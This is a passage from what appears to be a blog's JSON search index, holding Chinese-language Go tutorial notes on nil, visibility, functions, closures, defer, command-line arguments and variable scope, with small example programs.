//如果该变量的类型是结构体，那么才能去索引结构体中的字段 fmt.Printf(\u0026#34;%v\\n\u0026#34;, ixField.Tag) } func main() { tt := TagType{true, \u0026#34;Golang\u0026#34;, 11} for i := 0; i \u0026lt; 3; i++ { refTag(tt, i) } } /* 运行结果： An important answer The name of the thing How much there are */ 七、可见性 要使某个符号对其他包可见（可以访问），需要大写该符号的首字母。 如果想使用别的包的变量、函数、结构体类型、结构体成员，这些符号的首字母必须大写！ 如果是小写，只能在同一个包里使用！ 注意：结构体变量名大写了，但里面的成员名没有大写，同样会导致其他包无法访问！ 总结一句话：想要其他包访问到，首字母就大写！小写只能在同级包中可见！\n八、关于 nil 的笔记 nil 是 Golang 中的预定义标识符。用来表示：map、slice、channel、function、interface、pointer 的零值。\n8.1 未显示声明的数据类型，不能使用 nil 错误示例：\n1 2 3 4 func main() { var x = nil // use of untyped nil _ = x } 这段代码在编译时就会错误：use of untyped nil。大意：使用无类型的 nil。 nil 用来表示 6 个引用类型的零值，有 6 个引用类型，编译器无法猜测这个 nil 到底表示哪一个数据类型。 所以，必须要显示声明具体的数据类型后，才能使用 nil。 正确示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func main() { // slice var sli []int sli = nil _ = sli // map var m map[string]int m = nil _ = m // pointer var p *int // 指向 int 类型的指针 p = nil _ = p // channel var ch chan string // 一个传递 string 类型数据的通道 ch = nil _ = ch // function var f func(a, b int) int // 声明一个函数，接收两个 int 类型的参数，并最终返回一个 int 类型的值 f = nil _ = f // interface var x interface{} x = nil _ = x } 能够通过编译，一点问题都没有。\n8.2 Slice 和 map 为 nil 时，各自的区别 8.2.1 当 Slice 为 nil 时 当一个切片为 nil 时，往切片中添加元素是没有任何问题的。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 func main() { var s []int s = nil // 手动赋值了 nil，也不会影响接下来的元素添加操作 s = append(s, 111) s = append(s, 222) fmt.Println(\u0026#34;s =\u0026#34;, s) } /* 运行结果： s = [111 222] */ 个人分析原因：切片是对底层数组的引用，当有元素往切片中添加时，首先会检查该切片的容量。如果容量不够，就会先去扩容底层数组，然后再对该底层数组进行引用。设置为 nil 只是表示不去引用底层数组，当有元素往切片中添加，那么切片就需要一个底层数组了，Go 内部会去自动引用一个底层数组。\n8.2.1 当 map 为 nil 时 当 Slice 为 nil 时，如果往 map 中添加元素，就会导致运行时的 panic。 错误示例：\n1 2 3 4 5 func main() { var m map[string]string m[\u0026#34;a\u0026#34;] = \u0026#34;aaa\u0026#34; // panic: assignment to entry in nil map fmt.Println(\u0026#34;m =\u0026#34;, m) } 九、小案例 例1，生成随机数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) func main() { //1.设置种子 rand.Seed(time.Now().UnixNano()) //种子参数写死的话，每次随机数都一样了。所以把当前时间转换成纳秒作为种子参数 //2.生成随机数 for i := 0; i \u0026lt; 5; i++ { fmt.Println(\u0026#34;rand a number:\u0026#34;, rand.Intn(100)) //限定100以内的整数 } } /* 运行结果： rand a number: 31 rand a number: 24 rand a number: 58 rand a number: 86 rand a number: 28 */ 例2，猜数字小游戏 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) //随机生成一个4位数 func InitSlice(s []int) { n := cap(s) rand.Seed(time.Now().UnixNano()) for i := 0; i \u0026lt; n; i++ { //第1位数字不能为0 if i == 0 { for { r := rand.Intn(10) if r == 0 { continue } else { s[0] = r break } } } s[i] = rand.Intn(10) } } //获取输入的4位数的每一位数字 func GetEveryNum(guessSlice []int, guessNum int) { guessSlice[0] = guessNum / 1000 guessSlice[1] = guessNum / 100 % 10 guessSlice[2] = guessNum / 10 % 10 guessSlice[3] = guessNum % 10 } func Guess(s []int) { n := cap(s) guessSlice := make([]int, 4) for { var guessNum int //校验输入的数字是否是一个4位正整数 for { if guessNum \u0026lt; 1000 || guessNum \u0026gt; 9999 { fmt.Printf(\u0026#34;enter a guess number between 1000 and 9999:\u0026#34;) fmt.Scan(\u0026amp;guessNum) } else { break } } GetEveryNum(guessSlice, guessNum) right := 0 for i := 0; i \u0026lt; n; i++ { if guessSlice[i] \u0026lt; s[i] { fmt.Printf(\u0026#34;position %d number is small\\n\u0026#34;, i+1) } else if guessSlice[i] \u0026gt; s[i] { fmt.Printf(\u0026#34;posistion %d number is big\\n\u0026#34;, i+1) } else { fmt.Printf(\u0026#34;position %d number is right\\n\u0026#34;, i+1) right++ //猜对1位就自加1 } } //4位全部猜对打印信息并退出循环 if right == n { fmt.Println(\u0026#34;success.\u0026#34;) break } } } func main() { s := make([]int, 4, 4) InitSlice(s) Guess(s) fmt.Println(\u0026#34;init s, s=\u0026#34;, s) } /* 运行结果：enter a guess number between 1000 and 9999:1234 position 1 number is small position 2 number is small position 3 number is small posistion 4 number is big enter a guess number between 1000 and 9999:5555 position 1 number is small position 2 number is right position 3 number is right posistion 4 number is big enter a guess number between 1000 and 9999:6553 position 1 number is right position 2 number is right position 3 number is right posistion 4 number is big enter a guess number between 1000 and 9999:6551 position 1 number is right position 2 number is right position 3 number is right posistion 4 number is big enter a guess number between 1000 and 9999:6550 position 1 number is right position 2 number is right position 3 number is right position 4 number is right success. init s, s= [6 5 5 0] */ ","date":"2021-01-07T18:47:12Z","image":"https://w.wallhaven.cc/full/zy/wallhaven-zy9gwv.png","permalink":"https://360rce.github.io/p/wknjbadw/","title":"Golang学习之复合类型"},{"content":"一、基础函数 函数构成代码执行的逻辑结构。\n1.1 定义格式 函数基本构成元素：由关键字 func 开头，紧接着是一个函数名 FuncName，然后才是参数列表、返回值、函数体和返回语句。（参数列表、返回值、返回语句是可选的）\n1.1.1 基本语法 示例：\n1 2 3 4 5 6 func FuncName(/*参数列表*/) (o1 type1, o2 type2/*返回值：名称 数据类型*/) { //函数体 //也就是这一块区域里的代码 return v1, v2 //返回值 } 1.1.2 定义格式的说明 1.1.2.1 func func 是声明函数的关键字。\n1.1.2.2 函数名称 函数名称采用驼峰格式命名。Golang 规定：函数名首字母小写即对外部不可见，函数名首字母大写即对外部可见。\n1.1.2.3 参数列表 紧跟在函数名称后面的一对小括号 ()，不管有没有参数，这对小括号 () 必须写上！ 参数是可选的，可以是 0 个或者多个参数。参数格式为：参数名 数据类型。 Golang 没有默认参数！\n1.1.2.4 返回值 可选。如果这个函数没有返回值，就直接省略最后的返回参数以及 return 语句。 如果只有一个返回值且没有声明返回值的名称，那么就可以省略不写返回值名称以及括号，直接在函数体中使用 return 语句把这个只有一个的返回值给返回出去。但返回值的数据类型必须写！同理 1.1.1 的示例中，返回值声明了两个变量名（返回参数名称）o1 和 o2，这个也不是必须写的，可以只写数据类型而不写返回参数名称。 注意：Golang 没有默认值，如果函数没有返回值，Golang 是不会返回任何内容。在Golang中，函数没有返回值，那就是真的没有任何内容会返回出来了！ 例：\n1 2 3 4 5 6 7 8 9 10 11 12 package main import \u0026#34;fmt\u0026#34; func myFunc() { a := 6 fmt.Println(\u0026#34;a = \u0026#34;, a) } func main() { myFunc() } 如果有返回参数，函数体内必须写上 return 语句。\n1.2 有参数无返回值函数（普通参数列表） Golang 函数参数都属于必备参数，调用时必须传给它实参！\n1.2.1 形参与实参 形参：定义函数时，函数的参数。 实参：调用函数时，传递过去的值。\n1 2 3 4 5 6 7 8 9 10 //定义函数时，在函数第一个圆括号内定义的参数叫形成 //参数传递是单向传递，且只能由实参传递给形参，不能反过来 func MyTest(a int) { fmt.Println(\u0026#34;a=\u0026#34;, a) } func main() { //调用函数时，传递过去的参数叫实参 MyTest(111) } 1.2.2 多个同类型参数的简写方式 这样写非常简洁，但参数一多就容易发生混乱，到底这个参数是什么类型。\n1 2 3 4 5 6 7 8 9 //都同类型参数的时候，可以简写 func MyTest(a, b, c int) { fmt.Printf(\u0026#34;a=%d\\tb=%d\\tc=%d\\t\u0026#34;, a, b, c) //a=111\tb=222\tc=333\t} func main() { MyTest(111, 222, 333) } 1.2.3 多个不同类型参数列表的写法 参数多起来，建议每个参数都写明数据类型，这样不会造成数据类型弄错或忘记。\n1 2 3 4 5 6 7 8 func MyTest(name string, age int, salary float64) { fmt.Printf(\u0026#34;name=%s\\tage=%d\\tsalary=%f\\n\u0026#34;, name, age, salary) //name=golang\tage=11\tsalary=1234567890.000000 } func main() { MyTest(\u0026#34;golang\u0026#34;, 11, 1234567890) } 1.2.4 定义了几个参数，就必须传递几个值 如果定义的是普通参数列表，定义了几个参数，就必须传递几个值过去，否则就报错！\n1.3 不定参数列表 如果不知道到底会有几个参数，那么就可以用不定参数列表。不定参数列表是指函数传入的参数数量不确定，它是通过切片来实现的，且只能放在形参中的最后一个！\n1.3.1 不定参数类型的定义 首先将一个函数的形参定义为接受不定参数类型。 语法：func FuncName(varName ...Type)。（...Type其实就是一种语法糖，接收 0 个或者多个 Type 类型参数）\n1 2 3 4 5 6 7 8 //...int就是不定参数类型，接收0个或者多个int参数 func myTest(a ...int) { } func main() { myTest(111, 222) } 1.3.2 不定参数的传参 此时，传递过去的实参可以是 0 个或者多个。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import \u0026#34;fmt\u0026#34; //...int就是不定参数类型，接收0个或者多个int参数 func myTest(a ...int) { fmt.Println(a) fmt.Printf(\u0026#34;a type is : %T\\n\u0026#34;, a) fmt.Println(\u0026#34;--------------------------------\u0026#34;) } func main() { myTest() myTest(1) myTest(111, 222) } /* 运行结果： [] a type is : []int -------------------------------- [1] a type is : []int -------------------------------- [111 222] a type is : []int -------------------------------- */ 可以看到，不定参数使用切片来实现。\n1.3.3 不定参数必须放在形参的最后面 1 2 3 4 5 6 7 8 9 10 11 12 13 14 //注意：不定参数，一定（只能）放在形参中的最后一个参数 func myFunc03(args ...int, a int) { } func main() { myFunc02(111, 1, 2, 3) } /* 运行结果: # command-line-arguments .\\32_不定参数类型.go:34:15: syntax error: cannot use ... with non-final parameter args */ 报错大意：... 在列表中只能作为最后一个参数。\n1.3.4 不定实参传递给另一个函数的不定形参 不定参数作为实参，传递给另外一个函数的不定形参，另一个函数的形参必须也是一个不定参数类型。\n1.3.4.1 基本示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //参数类型被定义为不定参数 func f1(a ...int) { f2(a...) //不定参数作为实参，传递给目标函数 } //目标函数的形参也必须是不定参数类型 func f2(a ...int) { fmt.Printf(\u0026#34;a type is : %T, a=%v\\n\u0026#34;, a, a) } func main() { f1(1, 2, 3, 4, 5) } /* 运行结果： a type is : []int, a=[1 2 3 4 5] */ 1.3.4.2 形参和实参都要加上... 目标函数的形参需要定义成不定参数类型，传递过去的实参后面也需要加上 ...。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import \u0026#34;fmt\u0026#34; //想要接受不定参数，这里的形参也必须定义成不定参数 func myFunc(tmps ...int) { fmt.Println(tmps) } func test(args ...int) { //此处，想要把args全部传递给myFunc，需要这样写 myFunc(args...) //所有的都传过去了。...不能忘 } func main() { test(1, 2, 3, 4, 5) } /* 运行结果： [1 2 3 4 5] */ 注意：传递过去的时候，第 12 行 args 后面的 ... 不能忘。不定参数的类型是一个切片，不加 ... 就是一个数组类型。在 Golang 中，数组和切片是不同类型。\n1.3.4.3 可以使用切片截取 如果只想传递某几个元素过去，可以使用切片截取某个片段。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import \u0026#34;fmt\u0026#34; //想要接受不定参数，这里的形参也必须定义成不定参数 func myFunc(tmps ...int) { fmt.Println(tmps) } func test(args ...int) { //只想把元素2,3,4传递给myFunc myFunc(args[1:4]...) //...不能忘 } func main() { test(1, 2, 3, 4, 5) } /* 运行结果： [2 3 4] */ 1.4 无参有返回值 有返回值的函数，在函数体内必须通过 return 返回。\n1.4.1 一个返回值 只有一个返回值，可以不写该返回值的名称。\n1 2 3 4 5 6 7 func test() int { //不给返回值起名称 return 777 } func main() { fmt.Println(test()) //777 } 1.4.2 多个返回值 有多个返回值的时候，官方推荐给每个返回值起个名字。 下面这种写法是官方推荐：\n1 2 3 4 5 6 7 8 9 10 11 func test() (name string, age int) { //每个返回值都起了名称 //函数中可以直接使用这及格返回值的名称 name = \u0026#34;golang\u0026#34; age = 11 return //按照返回值参数定义的顺序，自动把name和age都给返回回去了 } func main() { fmt.Println(test()) //golang 11 } Golang 是按照返回值参数定义的顺序进行返回。 使用 Goland 时，按住 Ctrl，鼠标移动到函数上的时候，就能清晰看到那个函数返回了哪些信息，信息更加明显：\n1.5 有参数有返回值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func maxAndMin(a int, b int) (max int, min int) { if a \u0026gt; b { max = a min = b } else { max = b min = a } return } func main() { max, min := maxAndMin(10, 20) fmt.Printf(\u0026#34;max=%d, min=%d\\n\u0026#34;, max, min) a, _ := maxAndMin(10, 20) fmt.Printf(\u0026#34;max=%d\u0026#34;, a) } 二、递归函数 2.1 普通函数调用流程 先调用后返回，先进后出（FILO）。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 func funcc(c int) { fmt.Println(\u0026#34;c = \u0026#34;, c) } func funcb(b int) { funcc(b - 1) fmt.Println(\u0026#34;b = \u0026#34;, b) } func funca(a int) { funcb(a - 1) fmt.Println(\u0026#34;a = \u0026#34;, a) } func main() { funca(3) //函数调用 fmt.Println(\u0026#34;main\u0026#34;) } /* c = 1 b = 2 a = 3 main */ 2.2 递归函数的特性 递归函数可以直接或间接地调用自身，同样利用的是普通函数调用流程：先调用后返回、先进后出的特性。 递归函数通常有相同的结构：一个跳出条件和一个递归体。跳出条件就是根据传入的实参判断是否需要停止递归，递归体说白了就是包裹在函数体内的代码。\n2.3 递归函数调用流程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func test(a int) { if a == 1 { //函数终止调用的条件，非常重要 fmt.Println(\u0026#34;a = \u0026#34;, a) return //终止函数调用 } //函数调用自身 test(a - 1) fmt.Println(\u0026#34;a = \u0026#34;, a) } func main() { test(3) fmt.Println(\u0026#34;main\u0026#34;) } 2.4 数字累加 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //实现1+2+3+...100 func test01() (sum int) { for i := 1; i \u0026lt;= 100; i++ { sum += i } return } func test02(i int) (sum int) { if i == 100 { return 100 } return i + test02(i+1) } func main() { var sum int sum = test01() //普通方法实现 fmt.Println(\u0026#34;sum = \u0026#34;, sum) sum = test02(1) //递归实现 fmt.Println(\u0026#34;sum = \u0026#34;, sum) } 三、函数类型 Golang中，函数也是一个数据类型：所有拥有相同的参数、相同的返回值的一种数据类型。\n3.1 大致流程 3.1.1 给函数起一个别名。 使用关键字 type 声明一个函数类型。 语法：type 变量名 func(/*参数列表*/)。例：type myFunc func(int, int) int。 注意：type 定义的函数类型，func() 后面不能接返回值和大括号。\n3.1.2 声明一个函数类型的变量名 例：var f myFunc。声明一个变量，名称为 f，类型为 myFunc 函数类型。\n3.1.3 赋值给一个变量 把某个同类型参数以及同类型返回值的函数体赋值给一个变量。 例：f = add。注意：这个 add 的参数数量和参数类型必须和 f 函数的类型一模一样！\n3.1.4 通过这个变量来调用函数 变量名+小括号+实参，实现调用。例：f(10, 20)。\n3.2 综合示例，演示多态的思想 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package main import \u0026#34;fmt\u0026#34; func Add(a, b int) int { return a + b } func Minus(a, b int) int { return a - b } //函数也是一种数据类型，通过type给一个函数类型起名 //FuncType它是一个函数类型 type FuncType func(int, int) int //没有函数名字，没有{} func main() { var result int result = Add(1, 1) //传统调用方式 fmt.Println(\u0026#34;result = \u0026#34;, result) //声明一个函数类型的变量，变量名叫fTest var fTest FuncType fTest = Add //是变量就可以赋值 result = fTest(10, 20) //等价于Add(10,20) fmt.Println(\u0026#34;result2 = \u0026#34;, result) fTest = Minus result = fTest(10, 5) //等价于Minus(10, 5) fmt.Println(\u0026#34;result3 = \u0026#34;, result) } /* 运行结果： result = 2 result2 = 30 result3 = 5 */ 四、回调函数 所谓回调函数就是函数的参数里有一个参数是函数类型。\n4.1 大致流程 1.定义一个函数类型。 2 函数形参指定为一个函数类型。定义另一个函数，函数的参数列表里放入刚才定义的函数类型。此时，这个函数就变成了回调函数。 3.在回调函数内部去调用其他不同的函数。\n4.2 综合示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 //1.首先要定义一个函数类型 type myFunc func(int, int) int //每个函数的实现 //参数数量和数据类型以及返回值类型，要跟myFunc函数类型一模一样 func add(a, b int) int { return a + b } //每个函数的实现 //参数数量和数据类型以及返回值类型，要跟myFunc函数类型一模一样 func minus(a, b int) int { return a - b } //每个函数的实现 //参数数量和数据类型以及返回值类型，要跟myFunc指向的函数类型一模一样 func mul(a, b int) int { return a * b } //2.定义一个回调函数。函数的参数列表里，funcName形参被指定为myFunc函数类型，此时Calc就是一个回调函数 //多态：多种形态。调用同一个接口，可以实现不同的功能 func Calc(a, b int, funcName myFunc) (result int) { //传过来就是add,minus,mul三个中的一个，funcName可以动态变成add或minus或mul，以实现不同的功能 //调用函数依然采用：函数名+小括号的方式调用，这里就可以根据实际传过来的函数名去动态调用，动态实现不同功能 result = funcName(a, b) //return add(a, b) //这样就写死了，Calc这个函数只能实现add这个功能，而不能实现其他功能 return } func main() { a := Calc(3, 4, add) fmt.Println(\u0026#34;add a:\u0026#34;, a) a = Calc(3, 4, minus) fmt.Println(\u0026#34;minus a:\u0026#34;, a) a = Calc(3, 4, mul) fmt.Println(\u0026#34;mul a:\u0026#34;, a) } /* 运行结果： add a: 7 minus a: -1 mul a: 12 */ 注意：关键字 type 定义的函数类型的数据类型是什么，其他函数也必须跟它一样，不然数据类型不匹配就会报错。\n五、匿名函数与闭包 匿名函数是指不需要定义函数名称的一种函数实现方式。 在 Golang 中，所有的匿名函数（Golang 规范中称之为函数字面量）都是闭包。 闭包就是一个函数\u0026quot;捕获\u0026quot;了和它在同一作用域的其他常量和变量，闭包不关心\u0026quot;捕获\u0026quot;的常量和变量是否已经超出了作用域，只要闭包还在使用它们，这些常量和变量就还会存在。 闭包需要通过匿名函数来实现。\n5.1 无参无返回值的匿名函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main() { age := 11 name := \u0026#34;golang\u0026#34; //定义匿名函数 f1 := func() { //自动推导成为函数类型 fmt.Println(\u0026#34;name=\u0026#34;, name) fmt.Println(\u0026#34;age=\u0026#34;, age) } f1() //调用匿名函数 type myFunc func() //无参无返回值的函数类型 var f2 myFunc //声明变量f2为myFunc类型 f2 = f1 //都是无参无返回值的同类型函数，所以可以相互赋值 f2()\t//本质上就是在调用f1 //定义匿名函数且同时调用 func() { fmt.Printf(\u0026#34;name=%s\\tage=%d\\n\u0026#34;, name, age) }() //这个圆括号代表直接调用此匿名函数 } /* 运行结果： name= golang age= 11 name= golang age= 11 name=golang\tage=11 */ 5.2 带参数的匿名函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func main() { //匿名函数不需要写函数名称，这里只写上参数即可 //例如：func(i, j int) {/**/} //自动类型推导 f1 := func(i, j int) { fmt.Printf(\u0026#34;i=%d,j=%d\\n\u0026#34;, i, j) } f1(1, 2) func(i, j int) { fmt.Printf(\u0026#34;i=%d,j=%d\\n\u0026#34;, i, j) }(10, 20) //简单粗暴，定义且直接调用，记得小括号中要给参数，因为定义了有2个参数 } /* 运行结果： i=1,j=2 i=10,j=20 */ 5.3 有参数有返回值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 func main() { x, y := func(i, j int) (max, min int) { if i \u0026gt; j { max = i min = j } else { max = j min = i } return //定义了返回值，必须写上return }(10, 20) //这里加小括号表示直接调用 fmt.Printf(\u0026#34;max=%d,min=%d\\n\u0026#34;, x, y) //max=20,min=10 } 5.4 闭包捕获外部变量的特点 闭包是以 引用 的方式去捕获外部变量，用的是同一个变量。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func main() { a := 10 b := \u0026#34;str bbb\u0026#34; func() { //闭包以引用方式捕获外部变量 a = 999 //直接赋值，这里改了会影响外部，外部也被修改了 b = \u0026#34;golang\u0026#34; //直接赋值，这里改了会影响外部，外部也被修改了 fmt.Printf(\u0026#34;内部，a=%d,b=%s\\n\u0026#34;, a, b) }() //()代表直接调用，否则就需要用一个变量去接收这个匿名函数 fmt.Printf(\u0026#34;外部，a=%d,b=%s\\n\u0026#34;, a, b) } /* 运行结果： 内部，a=999,b=golang 外部，a=999,b=golang */ 但是，如果在闭包内使用海象运算符 := 声明了新变量，那么新变量就跟外部没有关系了。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { a := 10 b := \u0026#34;str bbb\u0026#34; func() { a := 999 b := \u0026#34;golang\u0026#34; fmt.Printf(\u0026#34;内部，a=%d,b=%s\\n\u0026#34;, a, b) }() //()代表直接调用，否则就需要用一个变量去接收这个匿名函数 fmt.Printf(\u0026#34;外部，a=%d,b=%s\\n\u0026#34;, a, b) } /* 运行结果： 内部，a=999,b=golang 外部，a=10,b=str bbb */ 5.5 只要闭包还在使用，变量就还存在 闭包\u0026quot;捕获\u0026quot;外部变量并不会去关心它的作用域，只要闭包还在使用这些变量，变量就会存在。也就是说闭包有记忆变量的特性。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func test1() func() int { //返回值是一个匿名函数，该匿名函数有一个int类型的返回值 var x int return func() int { //return语句后面接上这个匿名函数的函数体 x++ return x * x } } func main() { f := test1() fmt.Println(f()) fmt.Println(f()) fmt.Println(f()) fmt.Println(f()) } /* 1 4 9 16 */ 5.6 注意事项 1.匿名函数定义了必须要有变量去接收，或者在最后接圆括号 () 直接调用它。 2.闭包不能在函数体外声明。\n六、defer defer 用于延迟一个函数、方法、或者当前所创建的匿名函数的执行。常用于函数执行完毕被释放前的一些清理工作。 defer 只能出现在函数或者方法的内部！\n6.1 最基本的例子 1 2 3 4 5 6 7 8 9 10 11 12 func main() { fmt.Println(\u0026#34;aaa\u0026#34;) defer fmt.Println(\u0026#34;bbb\u0026#34;) //最后才执行的 fmt.Println(\u0026#34;ccc\u0026#34;) } /* 运行结果： aaa ccc bbb */ 6.2 多个defer的执行顺序 一个函数中有多个defer语句，它们会以FILO(先进后出)的顺序执行，哪怕函数或某个延迟调用发生错误，这些调用依旧会被执行。 多个defer的执行顺序的演示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package main import \u0026#34;fmt\u0026#34; func test(a int) { x := 100 / a fmt.Println(\u0026#34;x = \u0026#34;, x) } func main() { /** fmt.Println(\u0026#34;aaaaaaaaaaa\u0026#34;) fmt.Println(\u0026#34;bbbbbbbbbbb\u0026#34;) //调用一个函数，导致内存出问题 test(0) fmt.Println(\u0026#34;ccccccccccc\u0026#34;) 运行结果： aaaaaaaaaaa bbbbbbbbbbb panic: runtime error: integer divide by zero **/ /** defer fmt.Println(\u0026#34;aaaaaaaaaaa\u0026#34;) defer fmt.Println(\u0026#34;bbbbbbbbbbb\u0026#34;) //调用一个函数，导致内存出问题 test(0) defer fmt.Println(\u0026#34;ccccccccccc\u0026#34;) //这个defer还没有进栈中，所以不会打印出这行的内容，只会打印上面两行的内容 运行结果： bbbbbbbbbbb aaaaaaaaaaa panic: runtime error: integer divide by zero **/ /* defer fmt.Println(\u0026#34;aaaaaaaaaaa\u0026#34;) defer fmt.Println(\u0026#34;bbbbbbbbbbb\u0026#34;) //调用一个函数，导致内存出问题 defer test(0) //报错时，会放到最后一个被显示出来 defer fmt.Println(\u0026#34;ccccccccccc\u0026#34;) 运行结果： ccccccccccc bbbbbbbbbbb aaaaaaaaaaa panic: runtime error: integer divide by zero */ defer fmt.Println(\u0026#34;aaaaaaaaaaa\u0026#34;) defer fmt.Println(\u0026#34;bbbbbbbbbbb\u0026#34;) defer test(1) //在没有报错的情况下，defer 将按照先进后出的顺序执行 defer fmt.Println(\u0026#34;ccccccccccc\u0026#34;) /*运行结果： ccccccccccc x = 100 bbbbbbbbbbb aaaaaaaaaaa */ } 6.2 defer和匿名函数结合使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { a := 10 b := 20 defer func() { fmt.Printf(\u0026#34;defer语句，匿名函数内部：a=%d,b=%d\\n\u0026#34;, a, b) }() //()代表匿名函数直接执行 a = 111 b = 222 fmt.Printf(\u0026#34;外部：a=%d,b=%d\\n\u0026#34;, a, b) } /* 运行结果： 外部：a=111,b=222 defer语句，匿名函数内部：a=111,b=222 */ 在上例的基础中，给匿名函数传递两个实参：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { a := 10 b := 20 defer func(a, b int) { fmt.Printf(\u0026#34;匿名函数内部：a=%d,b=%d\\n\u0026#34;, a, b) }(a, b) //()代表匿名函数直接执行，把参数传递过去，已经先传递参数，只是没有调用 a = 111 b = 222 fmt.Printf(\u0026#34;外部：a=%d,b=%d\\n\u0026#34;, a, b) } /* 运行结果： 外部：a=111,b=222 匿名函数内部：a=10,b=20 */ 七、获取命令行参数 无论在哪个系统中敲命令，或多或少都会遇到带着参数的命令。比如：ping www.google.com，ping 是一个可执行程序 ，www.google.com 就是参数。 命令行以空格 space 区分各个参数，且以字符串方式传递！\n7.1 如何实现 需要用到 Golang 自带的 os.Args 变量，按F2即可看到官方对于这个变量的描述：\n1 2 // Args hold the command-line arguments, starting with the program name. var Args []string Args 保持住命令行参数，从程序自身的名字开始。\n7.2 最基本的例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) func main() { list := os.Args n := len(list) fmt.Println(\u0026#34;n = \u0026#34;, n) for i := 0; i \u0026lt; len(list); i++ { fmt.Printf(\u0026#34;list[%d] = %s\\n\u0026#34;, i, list[i]) } fmt.Println(\u0026#34;++++++++++++++++\u0026#34;) for i, data := range list { fmt.Printf(\u0026#34;list[%d] = %s\\n\u0026#34;, i, data) } } /* go run 48_获取命令行参数.go 4 42 n = 3 list[0] = C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\go-build346730226\\b001\\exe\\48_获取命令行参数.exe list[1] = 4 list[2] = 42 ++++++++++++++++ list[0] = C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\go-build346730226\\b001\\exe\\48_获取命令行参数.exe list[1] = 4 list[2] = 42 */ 第一个参数是程序自己本身的名称。 直接 go run 的方式只是人类自己看起来省力而已，Golang 底层依旧会先去编译并生成一个可执行程序，然后再运行这个可执行程序，如下图所示：\n八、作用域 作用域就是：变量起作用的范围。\n8.1 局部变量的特点 执行到定义变量的那句话，才开始分配内存空间，离开作用域被自动回收且被释放。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main //必须 import \u0026#34;fmt\u0026#34; func test() { a := 10 fmt.Println(\u0026#34;a = \u0026#34;, a) } func main() { //定义在{}里面的变量就是局部变量，只能在{}里面有效 //执行到定义变量那句话，才开始分配空间，离开作用域自动释放 //作用域，变量其作用的范围 //a = 111 { i := 10 //块级作用域，出了这对大括号的范围，i就会被自动释放 fmt.Println(\u0026#34;i = \u0026#34;, i) } //i = 111 if flag := 3; flag == 3 { //flag同样也是块级作用域内的变量，出了if块被自动回收并释放 fmt.Println(\u0026#34;flag = \u0026#34;, flag) } flag = 4 } 8.2 全局变量的特点 1.定义在函数外部的变量叫全局变量。 2.全局变量不能使用海象运算符 := 声明。 3.const 声明的名称不再是全局变量，而是 常量 了，是不允许被修改的。\n1 2 3 4 5 6 7 8 9 10 var a int //这个a是全局变量，可以给赋值 const b = 10 //const声明的b是常量了，不能给赋值 func main() { a = 10 fmt.Println(\u0026#34;a=\u0026#34;, a) b = 20 //cannot assign to b ===\u0026gt; 不能赋值给b } 8.3 不同作用域同名变量 1.不同作用域允许定义同名变量。 2.使用变量的原则：就近原则。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package main import \u0026#34;fmt\u0026#34; var a int func test() { fmt.Printf(\u0026#34;in test, a type is : %T\\n\u0026#34;, a) } func main() { var a byte fmt.Printf(\u0026#34;in main, a type is : %T\\n\u0026#34;, a) { var a float64 fmt.Printf(\u0026#34;in block, a type is : 